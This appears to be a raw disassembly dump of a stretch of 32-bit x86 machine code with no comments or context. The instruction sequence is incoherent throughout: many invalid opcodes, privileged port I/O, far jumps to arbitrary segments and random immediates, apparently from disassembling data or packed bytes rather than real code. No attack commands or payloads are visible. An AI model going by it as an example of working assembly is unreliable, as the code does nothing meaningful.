  40d3b3:	das    
  40d3b4:	mov    ecx,esi
  40d3b6:	(bad)  
  40d3b7:	hlt    
  40d3b8:	xor    bh,BYTE PTR [ecx]
  40d3ba:	fnstcw WORD PTR ds:0x8c56527f
  40d3c0:	or     edx,DWORD PTR [esi+0x62]
  40d3c3:	cmc    
  40d3c4:	jl     0x40d365
  40d3c6:	aad    0x60
  40d3c8:	sub    ch,BYTE PTR [edx+0x69]
  40d3cb:	call   0x1b49976e
  40d3d0:	aaa    
  40d3d1:	xchg   ecx,eax
  40d3d2:	or     al,0x1d
  40d3d4:	mov    edx,DWORD PTR [ecx-0x75c9400b]
  40d3da:	ret    0x464
  40d3dd:	bound  esi,QWORD PTR [eax+0x197367f4]
  40d3e3:	call   0x4e96c966
  40d3e8:	or     ch,BYTE PTR [esi]
  40d3ea:	pop    esi
  40d3eb:	mov    dh,0x4
  40d3ed:	cli    
  40d3ee:	or     eax,0x626205a4
  40d3f3:	stos   DWORD PTR es:[edi],eax
  40d3f4:	fbstp  TBYTE PTR [ebp+0x56]
  40d3f7:	daa    
  40d3f8:	adc    BYTE PTR [esi+0xc],bh
  40d3fb:	mov    ebx,0x1f063232
  40d400:	adc    BYTE PTR [esi+0x1],bh
  40d403:	mov    ebx,0xe7adcb1b
  40d408:	add    esi,DWORD PTR [ebp+0x6df663c5]
  40d40e:	fld    st(2)
  40d410:	ret    0x14d8
  40d413:	int3   
  40d414:	jmp    0x40d416
  40d416:	adc    esp,esp
  40d418:	bound  edi,QWORD PTR [ebp+edi*2+0x62062c20]
  40d41f:	jmp    0x40d3c8
  40d421:	sahf   
  40d422:	push   esi
  40d423:	popa   
  40d424:	repz retf 
  40d426:	jmp    0x4562:0x5e1960d6
  40d42d:	cld    
  40d42e:	mov    ebp,0x72a1ed9
  40d433:	adc    al,0x1
  40d435:	stos   DWORD PTR es:[edi],eax
  40d436:	pop    ecx
  40d437:	scas   eax,DWORD PTR es:[edi]
  40d438:	push   ebx
  40d439:	(bad)  
  40d43a:	out    dx,al
  40d43b:	arpl   WORD PTR [ebp+ecx*8+0x49],cx
  40d43f:	mov    bh,0xea
  40d441:	xlat   BYTE PTR ds:[ebx]
  40d442:	pop    esi
  40d443:	fld    DWORD PTR [ebx+0x32d56ea9]
  40d449:	test   eax,0x8650e2d4
  40d44e:	pop    ebp
  40d44f:	cmc    
  40d450:	or     al,0x72
  40d452:	jmp    0x40d40a
  40d454:	pop    ebx
  40d455:	jbe    0x40d43f
  40d457:	scas   eax,DWORD PTR es:[edi]
  40d458:	pop    esi
  40d459:	stos   DWORD PTR es:[edi],eax
  40d45a:	adc    eax,0xf57254af
  40d45f:	or     DWORD PTR [eax-0x46],edx
  40d462:	push   ebx
  40d463:	push   es
  40d464:	mov    WORD PTR [ecx+ebp*8+0xce86b1e],gs
  40d46b:	mov    al,0x55
  40d46d:	fwait
  40d46e:	ss pusha 
  40d470:	dec    ebx
  40d471:	inc    ecx
  40d472:	fadd   st,st(5)
  40d474:	or     cl,bl
  40d476:	and    ecx,ebx
  40d478:	mov    DWORD PTR [eax+eax*1-0x633faa33],esi
  40d47f:	mov    esi,0x69f15363
  40d484:	loope  0x40d488
  40d486:	jmp    0xa4ccdbec
  40d48b:	fstp   QWORD PTR [esi]
  40d48d:	mov    WORD PTR [ecx+ebx*8+0x61e9dbb6],?
  40d494:	(bad)  [ecx-0x7e2403ef]
  40d49a:	and    ch,al
  40d49c:	pop    ebx
  40d49d:	stc    
  40d49e:	out    0x72,al
  40d4a0:	sub    esi,edi
  40d4a2:	stos   BYTE PTR es:[edi],al
  40d4a3:	popa   
  40d4a4:	and    al,0x6c
  40d4a6:	push   0x65
  40d4a8:	lods   eax,DWORD PTR ds:[esi]
  40d4a9:	call   DWORD PTR [eax+eiz*2+0x5a]
  40d4ad:	jnp    0x40d4af
  40d4af:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d4b0:	xlat   BYTE PTR ds:[ebx]
  40d4b1:	jae    0x40d514
  40d4b3:	(bad)  
  40d4b4:	jnp    0x40d52a
  40d4b6:	pop    es
  40d4b7:	pop    eax
  40d4b8:	call   0xd14f:0x4d3d8963
  40d4bf:	lock and eax,0xa25dff53
  40d4c5:	cmp    DWORD PTR [esi+0x5e],edx
  40d4c8:	aam    0x49
  40d4ca:	jmp    0x40d506
  40d4cc:	adc    al,0x80
  40d4ce:	cli    
  40d4cf:	aas    
  40d4d0:	fild   DWORD PTR [eax]
  40d4d2:	add    BYTE PTR [eax],ch
  40d4d4:	mov    eax,ds:0x326dc032
  40d4d9:	add    dl,BYTE PTR [esi-0x80]
  40d4dc:	jg     0x40d460
  40d4de:	cli    
  40d4df:	add    cl,bh
  40d4e1:	(bad)  
  40d4e2:	and    DWORD PTR cs:[esi],0x56
  40d4e6:	push   DWORD PTR [ebx+eiz*2+0x2c]
  40d4ea:	int3   
  40d4eb:	call   0x41002e
  40d4f0:	jo     0x40d54f
  40d4f2:	test   bh,bh
  40d4f4:	scas   eax,DWORD PTR es:[edi]
  40d4f5:	stos   BYTE PTR es:[edi],al
  40d4f6:	gs add al,0xca
  40d4f9:	fld    DWORD PTR [eax]
  40d4fb:	push   esi
  40d4fc:	in     al,dx
  40d4fd:	pusha  
  40d4fe:	adc    al,0xa0
  40d500:	leave  
  40d501:	sbb    DWORD PTR [ecx],eax
  40d503:	test   DWORD PTR [ebx-0x22],edi
  40d506:	add    DWORD PTR [ebx-0x30759f80],eax
  40d50c:	arpl   di,di
  40d50e:	inc    ecx
  40d50f:	add    bh,BYTE PTR [ebx-0x47143cd4]
  40d515:	push   esp
  40d516:	(bad)  
  40d519:	call   FWORD PTR [ecx-0x37]
  40d51c:	dec    ecx
  40d51d:	mov    cl,0xfd
  40d51f:	push   esp
  40d520:	adc    BYTE PTR [esi-0x7e],al
  40d523:	in     al,dx
  40d524:	ja     0x40d50d
  40d526:	mov    eax,DWORD PTR [ebp+0x62]
  40d529:	test   BYTE PTR [ecx],dh
  40d52b:	push   0x63
  40d52d:	rcl    DWORD PTR [edx+0x1c1ab55],cl
  40d533:	add    dl,ah
  40d535:	shl    DWORD PTR [ecx],1
  40d537:	mov    edi,edx
  40d539:	push   0x7a
  40d53b:	dec    esp
  40d53c:	push   esi
  40d53d:	jl     0x40d52d
  40d53f:	pop    es
  40d540:	jb     0x40d544
  40d542:	add    eax,0xc6220085
  40d547:	out    dx,eax
  40d548:	mov    dl,BYTE PTR [edi-0x18fbe446]
  40d54e:	cmc    
  40d54f:	mov    WORD PTR [edi-0x21],cs
  40d552:	std    
  40d553:	nop
  40d554:	dec    edi
  40d555:	xlat   BYTE PTR ds:[ebx]
  40d556:	std    
  40d557:	mov    bh,ah
  40d559:	jnp    0x40d51d
  40d55b:	add    DWORD PTR [eax],eax
  40d55d:	or     eax,eax
  40d55f:	test   bh,al
  40d561:	or     eax,0x8f038a40
  40d566:	stos   BYTE PTR es:[edi],al
  40d567:	retf   0xf644
  40d56a:	lea    eax,[ebx+ecx*4]
  40d56d:	outs   dx,DWORD PTR ds:[esi]
  40d56e:	or     bh,BYTE PTR [ebp-0x3b]
  40d571:	mov    ecx,gs
  40d573:	ret    
  40d574:	add    esp,DWORD PTR [edx+0x44]
  40d577:	xor    BYTE PTR [ebp+0x4ff0de26],cl
  40d57d:	aad    0x66
  40d57f:	fst    QWORD PTR [ebx]
  40d581:	(bad)  
  40d583:	mov    BYTE PTR [ebx+0x7e],dh
  40d586:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d587:	test   dh,cl
  40d589:	mov    ebp,0xb5520158
  40d58e:	test   BYTE PTR [eax+0x41926614],cl
  40d594:	add    BYTE PTR [ebp+0x6dbf7e64],ah
  40d59a:	jle    0x40d5a1
  40d59c:	and    al,0x7a
  40d59e:	mov    ebx,0xd9720beb
  40d5a3:	daa    
  40d5a4:	add    al,0xd9
  40d5a6:	xchg   esp,eax
  40d5a7:	ds add BYTE PTR es:[eax-0x16cf1823],ah
  40d5af:	mov    ebp,0x90313338
  40d5b4:	sbb    bh,BYTE PTR [ecx+0x1e]
  40d5b7:	lods   eax,DWORD PTR ds:[esi]
  40d5b8:	pop    ss
  40d5b9:	xor    ecx,eax
  40d5bb:	xlat   BYTE PTR ds:[ebx]
  40d5bc:	sbb    dh,BYTE PTR [ebx]
  40d5be:	mov    cl,0x72
  40d5c0:	call   0x399a37c8
  40d5c5:	xor    eax,0x879c1ddb
  40d5ca:	push   esi
  40d5cb:	and    eax,0x566243f8
  40d5d0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d5d1:	adc    DWORD PTR [eax-0x54],edi
  40d5d4:	cld    
  40d5d5:	out    dx,eax
  40d5d6:	and    al,0x26
  40d5d8:	fadd   DWORD PTR [esi-0x78e5226a]
  40d5de:	mov    fs,ecx
  40d5e0:	outs   dx,BYTE PTR ds:[esi]
  40d5e1:	adc    DWORD PTR [esi],ecx
  40d5e3:	lods   al,BYTE PTR ds:[esi]
  40d5e4:	cld    
  40d5e5:	repz push ebp
  40d5e7:	sbb    eax,ebp
  40d5e9:	rcl    BYTE PTR [ebx],cl
  40d5eb:	lods   al,BYTE PTR ds:[esi]
  40d5ec:	fadd   QWORD PTR [edi-0x546a235d]
  40d5f2:	out    0x98,al
  40d5f4:	idiv   BYTE PTR [edi]
  40d5f6:	or     BYTE PTR [esp+edx*8-0x17e69209],ch
  40d5fd:	jns    0x40d59f
  40d5ff:	mov    edx,db0
  40d602:	pop    ebp
  40d603:	fnstcw WORD PTR [eax-0x48fcd0ce]
  40d609:	js     0x40d62c
  40d60b:	cmc    
  40d60c:	div    DWORD PTR [ebx]
  40d60e:	add    BYTE PTR [ecx-0x5d],dh
  40d611:	mov    ch,0x86
  40d613:	xor    ebp,esi
  40d615:	(bad)  
  40d616:	jp     0x40d5d3
  40d618:	add    dh,BYTE PTR [ebx-0x53]
  40d61b:	lods   al,BYTE PTR ss:[esi]
  40d61d:	add    BYTE PTR [edx+0x60fd9ae0],bh
  40d623:	jb     0x40d61a
  40d625:	sub    dh,ah
  40d627:	xchg   edx,eax
  40d628:	xlat   BYTE PTR ds:[ebx]
  40d629:	adc    BYTE PTR [ecx],ch
  40d62b:	push   si
  40d62d:	rcr    BYTE PTR [eax+edi*1+0x60],0x44
  40d632:	add    eax,0x3cc05476
  40d637:	bound  esp,QWORD PTR [eax-0x2]
  40d63a:	shl    BYTE PTR [edi],cl
  40d63c:	pop    esi
  40d63d:	dec    eax
  40d63e:	in     eax,dx
  40d63f:	loop   0x40d5e2
  40d641:	je     0x40d639
  40d643:	jmp    0x622c15f3
  40d648:	pop    esi
  40d649:	lock fs out dx,eax
  40d64c:	es sub eax,0x10f57564
  40d652:	cmp    DWORD PTR [edx+ebp*4+0x74],edi
  40d656:	int    0x41
  40d658:	inc    ecx
  40d659:	add    DWORD PTR [eiz*8+0x15dcfde7],edx
  40d660:	fild   DWORD PTR [eax-0x17]
  40d663:	loop   0x40d6cf
  40d665:	jae    0x40d65c
  40d667:	mov    BYTE PTR [esi],dl
  40d669:	and    eax,0x252e78fd
  40d66e:	stc    
  40d66f:	jbe    0x40d66b
  40d671:	jmp    0x9ca8d75c
  40d676:	call   0x11874b9
  40d67b:	ds mov al,0xab
  40d67e:	adc    esp,ebp
  40d680:	shr    edx,1
  40d682:	add    BYTE PTR [edx+0xc],ah
  40d685:	or     al,0x5f
  40d687:	les    edi,FWORD PTR [eax+0x10]
  40d68a:	ret    
  40d68b:	icebp  
  40d68c:	popa   
  40d68d:	rol    bh,0xa8
  40d690:	arpl   cx,bx
  40d692:	out    0x32,eax
  40d694:	xlat   BYTE PTR es:[ebx]
  40d696:	add    BYTE PTR [eax],al
  40d698:	(bad)  
  40d699:	das    
  40d69a:	jmp    0x7fec:0x825e6783
  40d6a1:	out    0x89,eax
  40d6a3:	pop    ebp
  40d6a4:	mov    bh,0xfc
  40d6a6:	mov    ecx,eax
  40d6a8:	inc    esp
  40d6a9:	cs push edx
  40d6ab:	and    al,0x77
  40d6ad:	das    
  40d6ae:	inc    edx
  40d6af:	and    al,0x7b
  40d6b1:	sub    ebx,ebx
  40d6b3:	jne    0x40d63a
  40d6b5:	mov    ebx,esi
  40d6b7:	mov    ebx,DWORD PTR [ebp-0x7072cdb0]
  40d6bd:	mov    ecx,0xd7a15109
  40d6c2:	mov    eax,ecx
  40d6c4:	and    esi,ebp
  40d6c6:	inc    ecx
  40d6c7:	add    DWORD PTR [ebx],edi
  40d6c9:	sub    edi,DWORD PTR [esi+0x7a308d75]
  40d6cf:	and    al,0x3f
  40d6d1:	in     eax,dx
  40d6d2:	imul   edi,edi,0xc1cf3138
  40d6d8:	add    dl,bl
  40d6da:	(bad)  
  40d6db:	call   0x118215d
  40d6e0:	mov    ebx,DWORD PTR [ebx+0x675f42a]
  40d6e6:	sar    dl,1
  40d6e8:	pop    eax
  40d6e9:	mov    al,0x86
  40d6eb:	mov    al,BYTE PTR [edi+eiz*2-0x5b]
  40d6ef:	push   esi
  40d6f0:	push   esi
  40d6f1:	mov    edx,ds
  40d6f3:	adc    BYTE PTR [ebx+0xc745443],cl
  40d6f9:	pushf  
  40d6fa:	fimul  DWORD PTR [eax]
  40d6fc:	call   DWORD PTR [edi]
  40d6fe:	mov    ah,BYTE PTR ds:0xfd9ceee8
  40d704:	inc    DWORD PTR [eax+0x5d]
  40d707:	test   bh,bh
  40d709:	add    ch,BYTE PTR [edi-0x8ac3176]
  40d70f:	aas    
  40d710:	add    ah,BYTE PTR [edx-0x40]
  40d713:	cwde   
  40d714:	add    eax,0x210e6e7
  40d719:	fld    TBYTE PTR [esi+0x78]
  40d71c:	(bad)  
  40d71d:	cmp    eax,0x7f8b284a
  40d722:	inc    esp
  40d723:	mov    edi,0x7845620f
  40d728:	jmp    0x40d70b
  40d72a:	xor    ecx,0x52
  40d72d:	xor    DWORD PTR [edi+0xb92048b],edx
  40d733:	inc    ecx
  40d734:	add    BYTE PTR [ebx-0x1e],ah
  40d737:	or     eax,0x1113a43a
  40d73c:	inc    esp
  40d73d:	add    BYTE PTR [edx-0x30],ah
  40d740:	adc    DWORD PTR [esi+eiz*4],0xffffff84
  40d744:	inc    ecx
  40d745:	add    BYTE PTR [edx],al
  40d747:	inc    ebx
  40d748:	or     eax,0x30a6244
  40d74d:	jne    0x40d7ab
  40d74f:	mov    dh,0x2
  40d751:	(bad)  
  40d752:	pop    edi
  40d753:	out    0xf,al
  40d755:	inc    esp
  40d756:	bound  edx,QWORD PTR [edi-0x44]
  40d759:	add    al,0x92
  40d75b:	mov    ds:0x67a003d,eax
  40d760:	inc    edx
  40d761:	add    bl,ch
  40d763:	lea    ebp,[ebp+0x5fb2a673]
  40d769:	iret   
  40d76a:	mov    ?,WORD PTR [esi+0x1]
  40d76d:	push   esi
  40d76e:	std    
  40d76f:	lods   eax,DWORD PTR ds:[esi]
  40d770:	inc    ecx
  40d771:	adc    ah,BYTE PTR [edx-0x243d884e]
  40d777:	jne    0x40d70a
  40d779:	mov    BYTE PTR [edi-0x25a3851a],al
  40d77f:	sub    bh,BYTE PTR [edi]
  40d781:	push   DWORD PTR [ecx]
  40d783:	inc    ebx
  40d784:	xor    BYTE PTR [edi],cl
  40d786:	adc    al,0xfb
  40d788:	bound  ecx,QWORD PTR [edi+0x51]
  40d78b:	fldcw  WORD PTR [ebx+0xb5c1103]
  40d791:	div    DWORD PTR [ebp+ebp*8-0x56e189a1]
  40d798:	mov    edx,0xe82c589b
  40d79d:	add    esp,esi
  40d79f:	cdq    
  40d7a0:	je     0x40d797
  40d7a2:	add    bl,ch
  40d7a4:	push   ds
  40d7a5:	test   DWORD PTR [ebp+ecx*8+0x4984a451],0x885959db
  40d7b0:	fistp  DWORD PTR [edx-0x27e918fb]
  40d7b6:	ins    BYTE PTR es:[edi],dx
  40d7b7:	xor    al,0x38
  40d7b9:	call   0x25ddafc1
  40d7be:	fild   QWORD PTR [edx]
  40d7c0:	pushf  
  40d7c1:	adc    al,0x8f
  40d7c3:	dec    ecx
  40d7c4:	pop    esp
  40d7c5:	ret    
  40d7c6:	sbb    BYTE PTR [ecx+0x3209b58b],dl
  40d7cc:	sub    eax,0xc63042c
  40d7d1:	ss fucomi st,st(0)
  40d7d4:	test   eax,0x24ed411c
  40d7d9:	adc    al,0xc8
  40d7db:	and    eax,0xae19870f
  40d7e0:	retf   
  40d7e1:	daa    
  40d7e2:	add    al,0xc2
  40d7e4:	mov    bl,bh
  40d7e6:	(bad)  
  40d7e7:	or     eax,0x64f8e880
  40d7ec:	pop    esp
  40d7ed:	or     al,0x58
  40d7ef:	jno    0x40d80e
  40d7f1:	call   0x2e1b3df9
  40d7f6:	or     DWORD PTR [esi-0x1afc5bd4],edx
  40d7fc:	lahf   
  40d7fd:	in     al,dx
  40d7fe:	rcl    DWORD PTR [eax+0x1d],cl
  40d801:	call   0x159ce21
  40d806:	jmp    0x74d8df0b
  40d80b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d80c:	popa   
  40d80d:	adc    dh,bh
  40d80f:	cld    
  40d810:	mov    eax,ds:0x6ce940c9
  40d815:	mov    ebp,DWORD PTR [edx-0x7]
  40d818:	fimul  WORD PTR [ebp*8-0x784874a0]
  40d81f:	pushf  
  40d820:	adc    eax,0x289eda52
  40d825:	sbb    eax,0xd961e8fd
  40d82a:	add    BYTE PTR [eax-0x52],cl
  40d82d:	sub    al,BYTE PTR [ebp-0x17]
  40d830:	xchg   edi,eax
  40d831:	or     DWORD PTR [ebx+0x3b],edx
  40d834:	push   ecx
  40d835:	outs   dx,DWORD PTR ds:[esi]
  40d836:	leave  
  40d837:	push   0xfffffffd
  40d839:	sar    ebp,cl
  40d83b:	adc    eax,0xd54b54d6
  40d840:	aaa    
  40d841:	mov    edi,0xd95e3b66
  40d846:	test   BYTE PTR [ecx-0x169539ab],ch
  40d84c:	repnz sbb eax,0x3f1839f9
  40d852:	or     cl,ch
  40d854:	popa   
  40d855:	sbb    esi,edi
  40d857:	sbb    al,0xaa
  40d859:	push   ecx
  40d85a:	jnp    0x40d7ed
  40d85c:	loopne 0x40d82b
  40d85e:	(bad)  
  40d85f:	fsub   QWORD PTR [ecx]
  40d861:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d862:	add    BYTE PTR [ecx+0x771d2d5e],0xa4
  40d869:	es cli 
  40d86b:	jmp    0x40d86d
  40d86d:	or     al,0xdb
  40d86f:	xor    DWORD PTR [ebx],edi
  40d871:	mov    WORD PTR [ecx+0x55],fs
  40d874:	shl    DWORD PTR [ecx+0xf],cl
  40d877:	(bad)  
  40d878:	cld    
  40d879:	add    eax,0xdce940cd
  40d87e:	call   0xf9:0x918d000c
  40d885:	inc    esi
  40d886:	mov    ecx,ebp
  40d888:	call   0x3e812f
  40d88d:	inc    ecx
  40d88e:	xchg   ecx,eax
  40d88f:	stc    
  40d890:	pop    edi
  40d891:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d892:	xchg   eax,ecx
  40d894:	ret    
  40d895:	in     eax,dx
  40d896:	push   edi
  40d897:	lock (bad) 
  40d899:	mov    ebp,0xbb409cfa
  40d89e:	xor    al,BYTE PTR [ebx]
  40d8a0:	jg     0x40d82c
  40d8a2:	(bad)  
  40d8a4:	inc    esp
  40d8a5:	lahf   
  40d8a6:	sar    bh,cl
  40d8a8:	jae    0x40d926
  40d8aa:	push   edi
  40d8ab:	retf   
  40d8ac:	call   0x43f3f1
  40d8b1:	lock adc bl,BYTE PTR [edx+eax*8+0x7f]
  40d8b6:	ficom  DWORD PTR [ebx-0x75]
  40d8b9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d8ba:	pop    esp
  40d8bb:	loope  0x40d8b5
  40d8bd:	clc    
  40d8be:	sub    BYTE PTR [edx+0x53],al
  40d8c1:	jge    0x40d917
  40d8c3:	lock xor edx,DWORD PTR [edx]
  40d8c6:	push   edi
  40d8c7:	fcom   DWORD PTR [edi-0x40]
  40d8ca:	and    cl,BYTE PTR [ecx-0x7806a08c]
  40d8d0:	jl     0x40d8d2
  40d8d2:	das    
  40d8d3:	ret    0x5c87
  40d8d6:	pop    ds
  40d8d7:	(bad)  
  40d8d8:	aaa    
  40d8d9:	dec    esi
  40d8da:	inc    edi
  40d8db:	mov    al,ds:0x51fa8b41
  40d8e0:	dec    ecx
  40d8e1:	and    al,0x3b
  40d8e3:	push   ebp
  40d8e4:	pop    ebx
  40d8e5:	or     BYTE PTR [eax],cl
  40d8e7:	add    bh,BYTE PTR [ecx]
  40d8e9:	or     ecx,DWORD PTR [esi]
  40d8eb:	cli    
  40d8ec:	dec    edi
  40d8ed:	push   ecx
  40d8ee:	push   0xffffff8a
  40d8f0:	push   eax
  40d8f1:	push   ecx
  40d8f2:	pop    eax
  40d8f3:	rdpmc  
  40d8f5:	leave  
  40d8f6:	xchg   ebx,eax
  40d8f7:	add    eax,0xb0620206
  40d8fc:	mov    al,BYTE PTR [ebx+0x3e]
  40d8ff:	lods   al,BYTE PTR ds:[esi]
  40d900:	xchg   BYTE PTR [edi+0x438bc957],bh
  40d906:	jle    0x40d888
  40d908:	xor    al,0xc9
  40d90a:	fidivr DWORD PTR [edx+0x25]
  40d90d:	mov    esp,DWORD PTR [esi]
  40d90f:	fcom   QWORD PTR [eax]
  40d911:	inc    edi
  40d912:	loope  0x40d903
  40d914:	sub    al,0x89
  40d916:	ss pushf 
  40d918:	sbb    DWORD PTR [ecx+0x3b119426],ecx
  40d91e:	and    al,0x84
  40d920:	repz sar DWORD PTR ds:0x39c28b7e,0x2b
  40d928:	pop    sp
  40d92a:	mov    al,ds:0x5d6a01b3
  40d92f:	add    eax,0x2d1b03f4
  40d934:	(bad)  
  40d935:	and    eax,DWORD PTR [eax]
  40d937:	and    DWORD PTR cs:[esi+0x24fab50e],0x66
  40d93f:	fistp  QWORD PTR [eax-0xb]
  40d942:	xor    DWORD PTR [ebp+0x23],ebp
  40d945:	lds    esp,FWORD PTR [ecx]
  40d947:	mov    esp,0x7b73423d
  40d94c:	aaa    
  40d94d:	push   edx
  40d94e:	out    0x8b,eax
  40d950:	xchg   BYTE PTR [edx],al
  40d952:	add    ah,al
  40d954:	daa    
  40d955:	(bad)  
  40d956:	and    ebp,DWORD PTR [esi-0x4d]
  40d959:	mov    eax,0x4171c4bf
  40d95e:	pop    es
  40d95f:	push   ebp
  40d960:	or     ecx,DWORD PTR [edx+0xe]
  40d963:	aad    0x70
  40d965:	leave  
  40d966:	inc    edi
  40d967:	mov    ?,WORD PTR [ebp-0x5a88187c]
  40d96d:	or     eax,0x28c6db66
  40d972:	ss or  edx,ebx
  40d975:	in     al,dx
  40d976:	jmp    0x3844e763
  40d97b:	pop    ebp
  40d97c:	ins    BYTE PTR es:[edi],dx
  40d97d:	and    ebp,ebp
  40d97f:	arpl   WORD PTR [ecx-0x269c3553],si
  40d985:	idiv   BYTE PTR [ecx-0x3092f5eb]
  40d98b:	xor    ecx,0xd71c293f
  40d991:	out    0x8e,eax
  40d993:	sub    ebp,edi
  40d995:	(bad)  
  40d996:	jmp    0x40d94c
  40d998:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d999:	push   ds
  40d99a:	add    BYTE PTR [eax],al
  40d99c:	cmp    cl,bl
  40d99e:	inc    edi
  40d9a0:	sbb    bh,dl
  40d9a2:	out    0x8c,eax
  40d9a4:	adc    ebp,edi
  40d9a6:	fild   DWORD PTR [edi-0x7f34d22b]
  40d9ac:	push   ss
  40d9ad:	shl    esi,1
  40d9af:	mov    eax,0xd398cd1f
  40d9b4:	jl     0x40d9e1
  40d9b6:	clc    
  40d9b7:	nop
  40d9b8:	and    ebp,edi
  40d9ba:	and    edx,esp
  40d9bc:	ficom  WORD PTR ds:0xed7a380c
  40d9c2:	sbb    eax,0xa75d6202
  40d9c7:	clc    
  40d9c8:	pop    esi
  40d9c9:	call   0xd7799e75
  40d9ce:	cli    
  40d9cf:	inc    ebx
  40d9d0:	fst    QWORD PTR [edi]
  40d9d2:	add    al,0x8b
  40d9d4:	cdq    
  40d9d5:	std    
  40d9d6:	repz xchg ebp,esi
  40d9d9:	cs jmp 0x2fc0cded
  40d9df:	setg   BYTE PTR [ecx+0x4ea4e62]
  40d9e6:	int3   
  40d9e7:	(bad)  
  40d9e9:	push   esp
  40d9ea:	xchg   DWORD PTR [edi+0xc],edi
  40d9ed:	push   esi
  40d9ee:	add    BYTE PTR ds:0x25c5f93a,ah
  40d9f4:	dec    edx
  40d9f5:	stc    
  40d9f6:	nop
  40d9f7:	mov    WORD PTR [esi],ds
  40d9f9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d9fa:	in     eax,0x41
  40d9fc:	and    eax,0x6200da
  40da01:	jmp    0x18fd:0x62621cf7
  40da08:	jb     0x40d9b4
  40da0a:	not    DWORD PTR [eax]
  40da0c:	cli    
  40da0d:	push   ds
  40da0e:	mov    cl,0x1
  40da10:	ss inc ebp
  40da12:	mov    ds:0xf7c26251,eax
  40da17:	or     al,0xbf
  40da19:	call   0xd8f6e734
  40da1e:	fisttp WORD PTR [eax+0x22fa162]
  40da24:	xchg   edx,eax
  40da25:	mov    DWORD PTR [esi-0xe],ecx
  40da28:	jb     0x40d9e4
  40da2a:	not    DWORD PTR [eax]
  40da2c:	shl    BYTE PTR [edi],cl
  40da2e:	(bad)  
  40da30:	ja     0x40da8f
  40da32:	call   0xab7fdcf7
  40da37:	inc    esp
  40da38:	or     eax,0x1274da56
  40da3d:	fisttp DWORD PTR [ecx-0x126fd82]
  40da43:	xor    BYTE PTR [edx],al
  40da45:	(bad)  
  40da47:	mov    dh,0xef
  40da49:	imul   ecx,DWORD PTR fs:[esi+esi*8],0xffffffdb
  40da4e:	(bad)  
  40da4f:	sbb    BYTE PTR [ebx],ah
  40da51:	sbb    al,0xeb
  40da53:	add    al,0xd0
  40da55:	cmp    al,BYTE PTR [eax-0x4fcb447d]
  40da5b:	jmp    0x8b1db64e
  40da60:	out    0x1b,al
  40da62:	sbb    eax,0xa900d346
  40da67:	sub    eax,0x88600cb
  40da6c:	jg     0x40da5f
  40da6e:	enter  0x3e16,0x5f
  40da72:	ins    DWORD PTR es:[edi],dx
  40da73:	jle    0x40da34
  40da75:	or     al,0xb
  40da77:	pop    esi
  40da78:	jmp    0x117e4a9
  40da7d:	push   ebx
  40da7e:	mov    dh,0x8c
  40da80:	push   esi
  40da81:	mov    ecx,edi
  40da83:	cli    
  40da84:	dec    esp
  40da85:	add    ebx,ecx
  40da87:	(bad)  
  40da88:	mov    edx,ebp
  40da8a:	push   eax
  40da8b:	fild   DWORD PTR [edi-0x76069894]
  40da91:	fnop   
  40da93:	fwait
  40da94:	add    DWORD PTR [edi],ecx
  40da96:	dec    eax
  40da97:	xor    BYTE PTR [ebx],ah
  40da99:	add    bl,cl
  40da9b:	out    0xf6,eax
  40da9d:	mov    DWORD PTR [edi],0x4f1b34fb
  40daa3:	and    edi,edi
  40daa5:	mov    edi,0x5cff3cfa
  40daab:	and    edi,DWORD PTR [edi-0x75]
  40daae:	pop    es
  40daaf:	cli    
  40dab0:	pop    esp
  40dab1:	add    DWORD PTR [ebx-0x2a],edi
  40dab4:	std    
  40dab5:	pop    es
  40dab6:	mov    al,0x9b
  40dab8:	add    eax,0x308e080f
  40dabd:	add    BYTE PTR [ebx+0x2c],bh
  40dac0:	and    BYTE PTR [ebx+esi*1],0xd6
  40dac4:	add    BYTE PTR [eax],al
  40dac6:	dec    ecx
  40dac7:	push   ecx
  40dac8:	and    DWORD PTR [eax+eax*1],0xd67b
  40dacf:	rcl    BYTE PTR [ecx-0x4078c7df],cl
  40dad5:	mov    DWORD PTR [edi+eiz*2+0x4b000081],ecx
  40dadc:	push   ebx
  40dadd:	inc    ecx
  40dade:	and    al,0xa3
  40dae0:	dec    esi
  40dae1:	pop    ecx
  40dae2:	and    al,0x62
  40dae4:	in     al,dx
  40dae5:	mov    DWORD PTR [ebx+0x46],ecx
  40dae8:	call   0xc47f5e76
  40daed:	add    DWORD PTR [eax],eax
  40daef:	bound  esp,QWORD PTR [edi]
  40daf1:	xchg   ecx,eax
  40daf2:	and    esp,DWORD PTR [edx-0x17fffe4f]
  40daf8:	cld    
  40daf9:	add    al,0xf
  40dafb:	lods   al,BYTE PTR ds:[esi]
  40dafc:	fisttp WORD PTR [ecx-0x7637b98d]
  40db02:	jae    0x40db42
  40db04:	aam    0x8c
  40db06:	inc    ebx
  40db07:	xchg   BYTE PTR [edi-0x7b81ac77],bh
  40db0d:	cmp    cl,0x54
  40db10:	mov    bl,0x84
  40db12:	in     al,dx
  40db13:	xchg   edx,eax
  40db14:	mov    al,0x1
  40db16:	pmuludq mm5,QWORD PTR ds:0xb022fc9a
  40db1d:	jl     0x40db42
  40db1f:	out    0x54,eax
  40db21:	jge    0x40db62
  40db23:	bound  edi,QWORD PTR [ebx-0x7c9cb34d]
  40db29:	mov    bl,0x44
  40db2b:	pusha  
  40db2c:	icebp  
  40db2d:	popa   
  40db2e:	pop    es
  40db2f:	add    BYTE PTR [ecx-0x18],bl
  40db32:	test   BYTE PTR [ecx+eiz*2+0x3f],bh
  40db36:	mov    cl,BYTE PTR [ebx+0x46]
  40db39:	fs or  al,0x85
  40db3c:	mov    ecx,0xc30001af
  40db41:	mov    ebx,0x396243e7
  40db46:	(bad)  
  40db47:	and    esi,DWORD PTR [edx+0x35]
  40db4a:	inc    edx
  40db4b:	push   cs
  40db4c:	ficom  WORD PTR [ebx+0x1]
  40db4f:	add    BYTE PTR [edx+0x2b],ah
  40db52:	int    0x67
  40db54:	xchg   ecx,eax
  40db55:	jb     0x40db18
  40db57:	mov    BYTE PTR [esi-0x13f11b2a],ah
